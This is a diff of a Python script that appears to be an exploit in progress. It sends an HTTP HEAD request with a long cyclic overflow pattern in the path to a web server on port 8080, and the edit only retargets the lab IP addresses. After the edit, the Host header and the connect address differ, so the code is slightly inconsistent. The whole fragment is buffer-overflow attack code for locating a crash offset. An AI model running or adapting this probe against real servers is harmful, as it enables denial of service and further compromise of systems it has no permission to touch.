@@ -17,12 +17,12 @@ Stage1 = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2A
  
 buffer = (
 "HEAD /" + Stage1 + " HTTP/1.1\r\n"
-"Host: 172.16.73.129:8080\r\n"
+"Host: 192.168.37.131:8080\r\n"
 "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; he; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12\r\n"
 "Keep-Alive: 115\r\n"
 "Connection: keep-alive\r\n\r\n")
  
 expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-expl.connect(("172.16.73.129", 8080))
+expl.connect(("192.168.37.140", 8080))
 expl.send(buffer)
 expl.close()
